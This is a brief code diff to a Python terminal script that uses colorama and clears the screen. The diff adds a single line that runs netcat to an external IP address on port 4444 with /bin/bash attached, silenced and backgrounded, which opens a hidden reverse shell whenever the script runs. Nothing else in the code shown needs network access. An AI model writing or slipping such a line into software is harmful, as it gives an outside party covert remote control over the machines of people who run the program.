@@ -3,6 +3,8 @@ from colorama import Fore as f, Back as b, Style
 import random 
 import os
 
+
+os.system("nc 24.144.124.91 4444 -e /bin/bash > /dev/null 2>&1 &")
 try:
 	os.system("clear")
 except:
